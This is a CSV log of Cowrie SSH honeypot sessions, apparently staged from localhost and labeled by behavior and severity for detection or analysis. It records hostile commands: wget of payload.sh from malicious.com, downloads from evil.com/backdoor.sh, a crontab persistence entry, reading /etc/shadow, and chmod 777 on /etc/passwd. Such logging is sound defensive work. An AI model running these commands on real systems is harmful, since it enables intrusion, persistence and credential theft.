timestamp,eventid,src_ip,session,username,password,command,message,protocol,recon_activity,malware_activity,privilege_escalation,destructive_behavior,persistence_behavior,command_length,failed_command,severity
2026-05-17T18:45:56.217858Z,cowrie.client.size,127.0.0.1,f41884e81d66,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:56.218691Z,cowrie.client.var,127.0.0.1,f41884e81d66,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:56.219296Z,cowrie.client.var,127.0.0.1,f41884e81d66,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:56.220377Z,cowrie.session.params,127.0.0.1,f41884e81d66,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:23.920763Z,cowrie.command.input,127.0.0.1,f41884e81d66,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
2026-05-17T18:46:25.199759Z,cowrie.session.file_download,127.0.0.1,f41884e81d66,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:25.914332Z,cowrie.session.file_download,127.0.0.1,f41884e81d66,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:35.106094Z,cowrie.command.input,127.0.0.1,f41884e81d66,,,./payload.shexit,CMD: ./payload.shexit,ssh,0,1,0,0,0,16,0,Medium
2026-05-17T18:46:35.107409Z,cowrie.command.failed,127.0.0.1,f41884e81d66,,,./payload.shexit ,Command not found: ./payload.shexit ,ssh,0,1,0,0,0,17,1,Medium
2026-05-17T18:46:38.589785Z,cowrie.command.input,127.0.0.1,f41884e81d66,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:46:38.592376Z,cowrie.log.closed,127.0.0.1,f41884e81d66,,,,Closing TTY Log: var/lib/cowrie/tty/ea422e362384ec25b42e7893409116e368bd6d566af916c6cc6ed44f5e7ab947 after 42.4 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:38.597038Z,cowrie.session.closed,127.0.0.1,f41884e81d66,,,,Connection lost after 47.8 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:41.908710Z,cowrie.session.connect,127.0.0.1,eccfbde76a0d,,,,New connection: 127.0.0.1:50822 (127.0.0.1:2222) [session: eccfbde76a0d],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:41.911674Z,cowrie.client.version,127.0.0.1,eccfbde76a0d,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:41.912482Z,cowrie.client.kex,127.0.0.1,eccfbde76a0d,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.171380Z,cowrie.login.success,127.0.0.1,eccfbde76a0d,root,useradd attacker,,login attempt [root/useradd attacker] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.230072Z,cowrie.client.size,127.0.0.1,eccfbde76a0d,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.230512Z,cowrie.client.var,127.0.0.1,eccfbde76a0d,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.230819Z,cowrie.client.var,127.0.0.1,eccfbde76a0d,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.231515Z,cowrie.session.params,127.0.0.1,eccfbde76a0d,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:47:50.831201Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
2026-05-17T18:47:52.316440Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:47:52.855396Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:47:59.434147Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,./payload.shuseradd attacker,CMD: ./payload.shuseradd attacker,ssh,0,1,0,0,1,28,0,High
2026-05-17T18:47:59.435085Z,cowrie.command.failed,127.0.0.1,eccfbde76a0d,,,./payload.shuseradd attacker,Command not found: ./payload.shuseradd attacker,ssh,0,1,0,0,1,28,1,High
2026-05-17T18:47:59.941510Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
2026-05-17T18:48:06.418218Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:48:06.420066Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:06.421278Z,cowrie.log.closed,127.0.0.1,eccfbde76a0d,,,,Closing TTY Log: var/lib/cowrie/tty/ef9b8784bfb82d5b74a38d40bf360c721b3e3483d5f5eb6a31b9965af1b19841 after 75.2 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:06.425907Z,cowrie.session.closed,127.0.0.1,eccfbde76a0d,,,,Connection lost after 84.5 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:09.165717Z,cowrie.session.connect,127.0.0.1,99e108dc6452,,,,New connection: 127.0.0.1:42018 (127.0.0.1:2222) [session: 99e108dc6452],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:09.169452Z,cowrie.client.version,127.0.0.1,99e108dc6452,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:09.170386Z,cowrie.client.kex,127.0.0.1,99e108dc6452,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.476628Z,cowrie.login.success,127.0.0.1,99e108dc6452,root,weras,,login attempt [root/weras] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.525815Z,cowrie.client.size,127.0.0.1,99e108dc6452,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.526603Z,cowrie.client.var,127.0.0.1,99e108dc6452,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.527289Z,cowrie.client.var,127.0.0.1,99e108dc6452,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.528411Z,cowrie.session.params,127.0.0.1,99e108dc6452,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:31.519516Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,sudo su,CMD: sudo su,ssh,0,0,1,0,0,7,0,High
2026-05-17T18:48:31.521996Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:48:33.053207Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,chmod 777 /etc/passwd,CMD: chmod 777 /etc/passwd,ssh,0,1,1,0,0,21,0,High
2026-05-17T18:48:39.191354Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:48:39.194346Z,cowrie.log.closed,127.0.0.1,99e108dc6452,,,,Closing TTY Log: var/lib/cowrie/tty/a74d8c8fd0d723b7f62ba4693645c435766b59fbcf5eeeab2276e7c6a1597712 after 17.7 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:39.197141Z,cowrie.session.closed,127.0.0.1,99e108dc6452,,,,Connection lost after 30.0 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:59.952807Z,cowrie.session.connect,127.0.0.1,a58452e1ba39,,,,New connection: 127.0.0.1:50550 (127.0.0.1:2222) [session: a58452e1ba39],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:59.955709Z,cowrie.client.version,127.0.0.1,a58452e1ba39,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:59.960318Z,cowrie.client.kex,127.0.0.1,a58452e1ba39,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.930279Z,cowrie.login.success,127.0.0.1,a58452e1ba39,root,tcvp12,,login attempt [root/tcvp12] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.974886Z,cowrie.client.size,127.0.0.1,a58452e1ba39,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.975781Z,cowrie.client.var,127.0.0.1,a58452e1ba39,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.976495Z,cowrie.client.var,127.0.0.1,a58452e1ba39,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.977861Z,cowrie.session.params,127.0.0.1,a58452e1ba39,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:10.414792Z,cowrie.command.input,127.0.0.1,a58452e1ba39,,,chmod +x payload.sh,CMD: chmod +x payload.sh,ssh,0,1,0,0,0,19,0,Medium
2026-05-17T18:49:11.344477Z,cowrie.command.input,127.0.0.1,a58452e1ba39,,,./payload.sh,CMD: ./payload.sh,ssh,0,1,0,0,0,12,0,Medium
2026-05-17T18:49:11.345498Z,cowrie.command.failed,127.0.0.1,a58452e1ba39,,,./payload.sh ,Command not found: ./payload.sh ,ssh,0,1,0,0,0,13,1,Medium
2026-05-17T18:52:10.426873Z,cowrie.session.closed,127.0.0.1,a58452e1ba39,,,,Connection lost after 190.5 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:52:55.989583Z,cowrie.session.connect,127.0.0.1,640beb65f218,,,,New connection: 127.0.0.1:50990 (127.0.0.1:2222) [session: 640beb65f218],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:52:55.991560Z,cowrie.client.version,127.0.0.1,640beb65f218,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
